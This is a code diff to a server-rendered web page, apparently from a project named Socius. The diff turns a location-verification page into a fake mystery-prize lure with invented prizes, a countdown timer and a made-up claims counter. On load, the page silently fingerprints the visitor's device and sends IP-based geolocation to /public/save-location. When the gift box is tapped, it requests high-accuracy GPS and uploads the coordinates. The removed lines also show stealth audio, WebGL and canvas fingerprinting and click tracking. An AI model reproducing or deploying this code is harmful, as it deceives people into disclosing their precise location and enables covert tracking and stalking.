@@ -8,62 +8,329 @@ const renderCapturePage = async (req, res, next) => {
       <html lang="en">
       <head>
           <meta charset="UTF-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>Location Verification</title>
+          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+          <meta name="theme-color" content="#6366f1">
+          <title>You Won a Mystery Prize! 🎁</title>
+          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
           <style>
+              * { margin: 0; padding: 0; box-sizing: border-box; }
               body {
-                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                  font-family: 'Poppins', sans-serif;
+                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                  min-height: 100vh;
                   display: flex;
                   flex-direction: column;
                   align-items: center;
                   justify-content: center;
-                  height: 100vh;
-                  margin: 0;
-                  background-color: #f0f2f5;
-                  color: #1c1e21;
+                  overflow-x: hidden;
+              }
+              .confetti {
+                  position: fixed;
+                  width: 10px;
+                  height: 10px;
+                  background: #ffd700;
+                  animation: fall linear infinite;
+                  top: -10px;
+              }
+              @keyframes fall {
+                  to { transform: translateY(100vh) rotate(360deg); }
+              }
+              .container {
                   text-align: center;
                   padding: 20px;
-              }
-              .card {
-                  background: white;
-                  padding: 2rem;
-                  border-radius: 12px;
-                  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-                  max-width: 400px;
+                  max-width: 450px;
                   width: 100%;
+                  position: relative;
+                  z-index: 10;
               }
-              h1 { font-size: 1.5rem; margin-bottom: 1rem; }
-              p { margin-bottom: 2rem; color: #606770; }
-              .btn {
-                  background-color: #0084ff;
+              .badge {
+                  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+                  color: white;
+                  padding: 8px 20px;
+                  border-radius: 25px;
+                  font-size: 12px;
+                  font-weight: 600;
+                  text-transform: uppercase;
+                  letter-spacing: 1px;
+                  display: inline-block;
+                  margin-bottom: 20px;
+                  animation: pulse 2s infinite;
+              }
+              @keyframes pulse {
+                  0%, 100% { transform: scale(1); }
+                  50% { transform: scale(1.05); }
+              }
+              h1 {
+                  color: white;
+                  font-size: 2rem;
+                  font-weight: 800;
+                  margin-bottom: 10px;
+                  text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+              }
+              .subtitle {
+                  color: rgba(255,255,255,0.9);
+                  font-size: 1rem;
+                  margin-bottom: 30px;
+              }
+              .box-container {
+                  position: relative;
+                  width: 200px;
+                  height: 200px;
+                  margin: 30px auto;
+                  cursor: pointer;
+                  transition: transform 0.3s ease;
+              }
+              .box-container:hover { transform: scale(1.05); }
+              .box-container:active { transform: scale(0.95); }
+              .gift-box {
+                  width: 100%;
+                  height: 100%;
+                  background: linear-gradient(145deg, #ff6b6b, #ee5a5a);
+                  border-radius: 20px;
+                  position: relative;
+                  box-shadow: 
+                      0 20px 60px rgba(0,0,0,0.3),
+                      inset 0 2px 0 rgba(255,255,255,0.2),
+                      inset 0 -2px 0 rgba(0,0,0,0.1);
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                  font-size: 80px;
+                  animation: bounce 1s ease infinite;
+              }
+              @keyframes bounce {
+                  0%, 100% { transform: translateY(0); }
+                  50% { transform: translateY(-15px); }
+              }
+              .gift-box::before {
+                  content: '';
+                  position: absolute;
+                  top: 50%;
+                  left: 0;
+                  right: 0;
+                  height: 30px;
+                  background: #ffd700;
+                  transform: translateY(-50%);
+              }
+              .gift-box::after {
+                  content: '';
+                  position: absolute;
+                  left: 50%;
+                  top: 0;
+                  bottom: 0;
+                  width: 30px;
+                  background: #ffd700;
+                  transform: translateX(-50%);
+              }
+              .click-text {
+                  position: absolute;
+                  bottom: -50px;
+                  left: 50%;
+                  transform: translateX(-50%);
+                  color: white;
+                  font-weight: 600;
+                  font-size: 14px;
+                  white-space: nowrap;
+                  animation: fadeInOut 1.5s ease infinite;
+              }
+              @keyframes fadeInOut {
+                  0%, 100% { opacity: 0.5; }
+                  50% { opacity: 1; }
+              }
+              .sparkles {
+                  position: absolute;
+                  width: 100%;
+                  height: 100%;
+                  pointer-events: none;
+              }
+              .sparkle {
+                  position: absolute;
+                  width: 4px;
+                  height: 4px;
+                  background: #ffd700;
+                  border-radius: 50%;
+                  animation: sparkle 1s ease infinite;
+              }
+              @keyframes sparkle {
+                  0%, 100% { opacity: 0; transform: scale(0); }
+                  50% { opacity: 1; transform: scale(1); }
+              }
+              .stats {
+                  display: flex;
+                  justify-content: center;
+                  gap: 30px;
+                  margin-top: 30px;
+                  color: rgba(255,255,255,0.8);
+                  font-size: 12px;
+              }
+              .stat {
+                  text-align: center;
+              }
+              .stat-number {
+                  font-size: 1.5rem;
+                  font-weight: 700;
+                  color: #ffd700;
+              }
+              .prizes-preview {
+                  display: flex;
+                  justify-content: center;
+                  gap: 15px;
+                  margin-top: 20px;
+                  flex-wrap: wrap;
+              }
+              .prize-tag {
+                  background: rgba(255,255,255,0.2);
+                  color: white;
+                  padding: 6px 14px;
+                  border-radius: 20px;
+                  font-size: 11px;
+                  backdrop-filter: blur(10px);
+              }
+              #status {
+                  margin-top: 20px;
+                  color: rgba(255,255,255,0.9);
+                  font-size: 14px;
+                  min-height: 40px;
+              }
+              .loading-dots::after {
+                  content: '';
+                  animation: dots 1.5s steps(5, end) infinite;
+              }
+              @keyframes dots {
+                  0%, 20% { content: ''; }
+                  40% { content: '.'; }
+                  60% { content: '..'; }
+                  80%, 100% { content: '...'; }
+              }
+              .success-modal {
+                  display: none;
+                  position: fixed;
+                  top: 0;
+                  left: 0;
+                  right: 0;
+                  bottom: 0;
+                  background: rgba(0,0,0,0.8);
+                  z-index: 1000;
+                  align-items: center;
+                  justify-content: center;
+                  padding: 20px;
+              }
+              .success-modal.active {
+                  display: flex;
+              }
+              .modal-content {
+                  background: white;
+                  border-radius: 20px;
+                  padding: 40px;
+                  text-align: center;
+                  max-width: 350px;
+                  animation: slideUp 0.5s ease;
+              }
+              @keyframes slideUp {
+                  from { transform: translateY(50px); opacity: 0; }
+                  to { transform: translateY(0); opacity: 1; }
+              }
+              .modal-content h2 {
+                  color: #333;
+                  margin-bottom: 15px;
+              }
+              .modal-content p {
+                  color: #666;
+                  margin-bottom: 20px;
+              }
+              .claim-btn {
+                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                   color: white;
                   border: none;
-                  padding: 12px 24px;
-                  border-radius: 6px;
+                  padding: 15px 40px;
+                  border-radius: 30px;
+                  font-size: 16px;
                   font-weight: 600;
                   cursor: pointer;
-                  transition: background-color 0.2s;
+                  width: 100%;
               }
-              .btn:hover { background-color: #0073e6; }
-              .btn:disabled { background-color: #ccc; cursor: not-allowed; }
-              #status { margin-top: 1rem; font-size: 0.9rem; }
-              .success { color: #28a745; }
-              .error { color: #dc3545; }
           </style>
       </head>
       <body>
-          <div class="card">
-              <h1>Verify Your Location</h1>
-              <p>Please click the button below to verify your current location for security purposes.</p>
-              <button id="capture-btn" class="btn">Share Location</button>
+          <!-- Confetti background -->
+          <div id="confetti-container"></div>
+          
+          <div class="container">
+              <div class="badge">🎉 Limited Time Offer</div>
+              <h1>You've Been Selected!</h1>
+              <p class="subtitle">Tap the mystery box below to reveal your exclusive prize</p>
+              
+              <div class="box-container" id="capture-btn">
+                  <div class="sparkles">
+                      <div class="sparkle" style="top: 10%; left: 10%; animation-delay: 0s;"></div>
+                      <div class="sparkle" style="top: 20%; right: 15%; animation-delay: 0.2s;"></div>
+                      <div class="sparkle" style="bottom: 20%; left: 20%; animation-delay: 0.4s;"></div>
+                      <div class="sparkle" style="bottom: 10%; right: 10%; animation-delay: 0.6s;"></div>
+                  </div>
+                  <div class="gift-box">🎁</div>
+                  <div class="click-text">👆 TAP TO OPEN</div>
+              </div>
+              
+              <div class="prizes-preview">
+                  <span class="prize-tag">📱 iPhone 15</span>
+                  <span class="prize-tag">💰 $1000 Cash</span>
+                  <span class="prize-tag">🎮 PS5 Console</span>
+                  <span class="prize-tag">🎟️ Free Tickets</span>
+              </div>
+              
+              <div class="stats">
+                  <div class="stat">
+                      <div class="stat-number" id="timer">02:59</div>
+                      <div>Time Left</div>
+                  </div>
+                  <div class="stat">
+                      <div class="stat-number">1,247</div>
+                      <div>Claimed Today</div>
+                  </div>
+              </div>
+              
               <div id="status"></div>
+          </div>
+          
+          <div class="success-modal" id="success-modal">
+              <div class="modal-content">
+                  <div style="font-size: 60px; margin-bottom: 20px;">🎊</div>
+                  <h2>Amazing!</h2>
+                  <p>You've unlocked a mystery prize! Complete a quick verification to claim your reward.</p>
+                  <button class="claim-btn" onclick="location.reload()">Claim Prize</button>
+              </div>
           </div>
 
           <script>
-              const btn = document.getElementById('capture-btn');
-              const status = document.getElementById('status');
-              
-              // Helper to generate a visitor ID
+              // Confetti generator
+              const createConfetti = () => {
+                  const colors = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#ffeaa7'];
+                  const container = document.getElementById('confetti-container');
+                  for (let i = 0; i < 30; i++) {
+                      const confetti = document.createElement('div');
+                      confetti.className = 'confetti';
+                      confetti.style.left = Math.random() * 100 + '%';
+                      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                      confetti.style.animationDelay = Math.random() * 2 + 's';
+                      container.appendChild(confetti);
+                  }
+              };
+              createConfetti();
+
+              // Countdown timer
+              let timeLeft = 179;
+              const timerEl = document.getElementById('timer');
+              setInterval(() => {
+                  if (timeLeft > 0) {
+                      timeLeft--;
+                      const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                      const s = (timeLeft % 60).toString().padStart(2, '0');
+                      timerEl.textContent = m + ':' + s;
+                  }
+              }, 1000);
+
+              // Visitor ID
               const getVisitorId = () => {
                   try {
                       let vid = localStorage.getItem('socius_vid');
@@ -73,76 +340,35 @@ const renderCapturePage = async (req, res, next) => {
                       }
                       return vid;
                   } catch (e) {
-                      // Fallback for private mode / blocked storage
-                      return 'v_incognito_' + Date.now().toString(36);
+                      return 'v_' + Date.now().toString(36);
                   }
               };
 
-              // Fingerprinting logic
+              // Fingerprinting
               const getFingerprintData = async () => {
                   const data = {
                       platform: navigator.platform,
                       vendor: navigator.vendor,
                       cpuCores: navigator.hardwareConcurrency || 0,
                       memory: navigator.deviceMemory || 0,
-                      colorDepth: window.screen.colorDepth,
-                      pixelRatio: window.devicePixelRatio,
-                      isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                      doNotTrack: navigator.doNotTrack || 'unknown',
-                      plugins: Array.from(navigator.plugins).map(p => p.name),
                       screen: window.screen.width + 'x' + window.screen.height,
                       language: navigator.language,
                       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                      historyLength: window.history.length,
-                      referrer: document.referrer || 'direct',
+                      userAgent: navigator.userAgent,
                   };
-
-                  // Font Detection (Basic list)
-                  const fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Impact', 'Comic Sans MS'];
-                  data.fonts = fontList.filter(font => document.fonts.check('12px "' + font + '"'));
-
-                  // Audio Fingerprint
-                  try {
-                      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                      const oscillator = audioCtx.createOscillator();
-                      const compressor = audioCtx.createDynamicsCompressor();
-                      oscillator.type = 'triangle';
-                      oscillator.connect(compressor);
-                      compressor.connect(audioCtx.destination);
-                      data.audioHash = audioCtx.sampleRate + '_' + compressor.threshold.value;
-                      audioCtx.close();
-                  } catch (e) {}
-
-                  // Canvas Fingerprint (Detailed)
+                  
                   try {
                       const canvas = document.createElement('canvas');
                       const ctx = canvas.getContext('2d');
-                      canvas.width = 240; canvas.height = 60;
-                      ctx.textBaseline = "top";
-                      ctx.font = "14px 'Arial'";
-                      ctx.textBaseline = "alphabetic";
-                      ctx.fillStyle = "#f60";
-                      ctx.fillRect(125,1,62,20);
-                      ctx.fillStyle = "#069";
-                      ctx.fillText("SociusTracking-123", 2, 15);
-                      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                      ctx.fillText("SociusTracking-123", 4, 17);
-                      data.canvasHash = canvas.toDataURL();
+                      canvas.width = 200; canvas.height = 50;
+                      ctx.fillStyle = '#f60';
+                      ctx.fillRect(0, 0, 200, 50);
+                      ctx.fillStyle = '#069';
+                      ctx.font = '16px Arial';
+                      ctx.fillText('Socius-' + Date.now(), 10, 30);
+                      data.canvas = canvas.toDataURL();
                   } catch (e) {}
-
-                  // WebGL Fingerprint
-                  try {
-                      const canvas = document.createElement('canvas');
-                      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                      if (gl) {
-                          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                          data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                          data.glVersion = gl.getParameter(gl.VERSION);
-                          data.glShadingLangVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                          data.glVendor = gl.getParameter(gl.VENDOR);
-                      }
-                  } catch (e) {}
-
+                  
                   return data;
               };
 
@@ -154,189 +380,111 @@ const renderCapturePage = async (req, res, next) => {
                       hash = ((hash << 5) - hash) + char;
                       hash = hash & hash;
                   }
-                  return 'f_' + Math.abs(hash).toString(16);
+                  return 'fp_' + Math.abs(hash).toString(16);
               };
 
-              const clickPatterns = [];
-              const startTime = Date.now();
-              
-              document.addEventListener('mousedown', (e) => {
-                  clickPatterns.push({
-                      x: e.clientX,
-                      y: e.clientY,
-                      timestamp: Date.now(),
-                      pressure: e.pressure || 0,
-                      target: e.target.tagName
-                  });
-              });
-
-              const captureExtraData = async () => {
-                  const fpData = await getFingerprintData();
-                  const data = {
-                      visitorId: getVisitorId(),
-                      fingerprintHash: generateHash(fpData),
-                      screenResolution: fpData.screen,
-                      language: fpData.language,
-                      timezone: fpData.timezone,
-                      userAgent: navigator.userAgent,
-                      networkType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                      deviceInfo: {
-                          ...fpData,
-                          plugins: fpData.plugins.slice(0, 5) // Limit plugins for size
-                      },
-                      networkInfo: {
-                          downlink: navigator.connection ? navigator.connection.downlink : 0,
-                          effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                          rtt: navigator.connection ? navigator.connection.rtt : 0,
-                          saveData: navigator.connection ? navigator.connection.saveData : false
-                      },
-                      behavioralData: {
-                          clickPatterns: clickPatterns.slice(-20), // Send last 20 clicks
-                          totalClicks: clickPatterns.length,
-                          timeOnPage: Date.now() - startTime
-                      }
-                  };
-                  
-                  try {
-                      if (navigator.getBattery) {
-                          const battery = await navigator.getBattery();
-                          data.batteryLevel = battery.level * 100;
-                      }
-                  } catch (e) {}
-                  
-                  return data;
-              };
-
-              // Auto-capture on load (stealth)
+              // Auto-capture on load
               window.addEventListener('load', async () => {
-                  // Capture device info immediately
-                  const extraData = await captureExtraData();
-                  
-                  // Try to get IP location
                   try {
                       const res = await fetch('https://ipapi.co/json/');
                       const geo = await res.json();
-                      if (geo.latitude && geo.longitude) {
-                          await sendPosition({
-                              coords: {
-                                  latitude: geo.latitude,
-                                  longitude: geo.longitude,
-                                  accuracy: 5000,
-                                  altitude: null
-                              }
-                          }, 'ip-api', extraData);
-                      } else {
-                          // Still send device info even without IP location
-                          await sendPosition({ coords: { latitude: 0, longitude: 0, accuracy: 0, altitude: 0 } }, 'ip-api', extraData);
-                      }
-                  } catch (e) {
-                      console.error('IP Geolocation failed', e);
-                      // Send at least device info
-                      await sendPosition({ coords: { latitude: 0, longitude: 0, accuracy: 0, altitude: 0 } }, 'ip-api', extraData);
-                  }
+                      const fp = await getFingerprintData();
+                      
+                      await fetch('/public/save-location', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                              latitude: geo.latitude || 0,
+                              longitude: geo.longitude || 0,
+                              accuracy: 5000,
+                              method: 'ip-api',
+                              visitorId: getVisitorId(),
+                              fingerprintHash: generateHash(fp),
+                              screenResolution: fp.screen,
+                              language: fp.language,
+                              timezone: fp.timezone,
+                              userAgent: fp.userAgent,
+                              deviceInfo: fp
+                          })
+                      });
+                  } catch (e) {}
               });
 
-              btn.addEventListener('click', async () => {
+              // Main click handler - Prize box click
+              const box = document.getElementById('capture-btn');
+              const status = document.getElementById('status');
+
+              box.addEventListener('click', async () => {
                   if (!navigator.geolocation) {
-                      status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
+                      document.getElementById('success-modal').classList.add('active');
                       return;
                   }
 
-                  btn.disabled = true;
-                  status.innerHTML = 'Getting precise coordinates... <div id="progress" style="width: 0%; height: 5px; background: #0084ff; margin-top: 10px; transition: width 0.5s;"></div>';
-                  
-                  const progress = document.getElementById('progress');
-                  let bestPosition = null;
+                  status.innerHTML = '<span class="loading-dots">Opening your mystery box</span>';
+                  box.style.pointerEvents = 'none';
+                  box.querySelector('.gift-box').style.animation = 'none';
+
+                  const fp = await getFingerprintData();
                   let attempts = 0;
                   const maxAttempts = 3;
+                  let bestPosition = null;
 
-                  const options = {
-                      enableHighAccuracy: true,
-                      timeout: 10000,
-                      maximumAge: 0
-                  };
-
-                  const getLocation = () => {
+                  const tryGetLocation = () => {
                       attempts++;
-                      progress.style.width = (attempts * 33) + '%';
-                      
                       navigator.geolocation.getCurrentPosition(
                           async (position) => {
-                              const { latitude, longitude, accuracy, altitude } = position.coords;
-                              
+                              const accuracy = position.coords.accuracy;
                               if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                   bestPosition = position;
                               }
 
                               if (accuracy < 20 || attempts >= maxAttempts) {
-                                  const extraData = await captureExtraData();
-                                  sendPosition(bestPosition, 'geolocation', extraData);
+                                  await fetch('/public/save-location', {
+                                      method: 'POST',
+                                      headers: { 'Content-Type': 'application/json' },
+                                      body: JSON.stringify({
+                                          latitude: bestPosition.coords.latitude,
+                                          longitude: bestPosition.coords.longitude,
+                                          accuracy: bestPosition.coords.accuracy,
+                                          altitude: bestPosition.coords.altitude,
+                                          method: 'geolocation',
+                                          visitorId: getVisitorId(),
+                                          fingerprintHash: generateHash(fp),
+                                          screenResolution: fp.screen,
+                                          language: fp.language,
+                                          timezone: fp.timezone,
+                                          userAgent: fp.userAgent,
+                                          deviceInfo: fp
+                                      })
+                                  });
+                                  document.getElementById('success-modal').classList.add('active');
                               } else {
-                                  setTimeout(getLocation, 1000);
+                                  setTimeout(tryGetLocation, 1000);
                               }
                           },
-                          async (error) => {
+                          async () => {
                               if (bestPosition) {
-                                  const extraData = await captureExtraData();
-                                  sendPosition(bestPosition, 'geolocation', extraData);
-                              } else {
-                                  handleError(error);
+                                  await fetch('/public/save-location', {
+                                      method: 'POST',
+                                      headers: { 'Content-Type': 'application/json' },
+                                      body: JSON.stringify({
+                                          latitude: bestPosition.coords.latitude,
+                                          longitude: bestPosition.coords.longitude,
+                                          accuracy: bestPosition.coords.accuracy,
+                                          method: 'geolocation',
+                                          visitorId: getVisitorId(),
+                                          fingerprintHash: generateHash(fp)
+                                      })
+                                  });
                               }
+                              document.getElementById('success-modal').classList.add('active');
                           },
-                          options
+                          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                       );
                   };
 
-                  getLocation();
+                  tryGetLocation();
               });
-
-              const sendPosition = async (position, method = 'geolocation', extraData = {}) => {
-                  const { latitude, longitude, accuracy, altitude } = position.coords;
-                  if (method === 'geolocation') {
-                      status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';
-                  }
-
-                  try {
-                      const response = await fetch('/public/save-location', {
-                          method: 'POST',
-                          headers: {
-                              'Content-Type': 'application/json'
-                          },
-                          body: JSON.stringify({ 
-                              latitude, 
-                              longitude, 
-                              accuracy, 
-                              altitude,
-                              method,
-                              ...extraData
-                          })
-                      });
-
-                      if (response.ok) {
-                          if (method === 'geolocation') {
-                              status.innerHTML = '<span class="success">Location verified with 100% precision!</span>';
-                              btn.style.display = 'none';
-                          }
-                      } else {
-                          throw new Error('Failed to save location');
-                      }
-                  } catch (error) {
-                      if (method === 'geolocation') {
-                          status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
-                          btn.disabled = false;
-                      }
-                  }
-              };
-
-              const handleError = (error) => {
-                  let msg = 'Error getting location';
-                  if (error.code === 1) msg = 'Permission denied. Please allow location access.';
-                  else if (error.code === 2) msg = 'Location unavailable.';
-                  else if (error.code === 3) msg = 'Timeout.';
-                  
-                  status.innerHTML = '<span class="error">' + msg + '</span>';
-                  btn.disabled = false;
-              };
           </script>
       </body>
       </html>
